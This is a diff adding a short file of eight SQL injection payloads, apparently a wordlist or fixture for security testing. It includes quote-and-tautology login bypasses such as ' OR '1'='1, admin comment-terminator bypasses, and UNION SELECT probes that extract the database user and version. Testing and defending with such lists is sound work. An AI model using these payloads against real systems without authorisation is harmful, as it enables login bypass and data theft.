@@ -1,0 +1,8 @@
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' #
+admin'--
+admin'#
+') OR '1'='1--
+' UNION SELECT 1,2,3--
+' AND 1=0 UNION SELECT user(),version()--
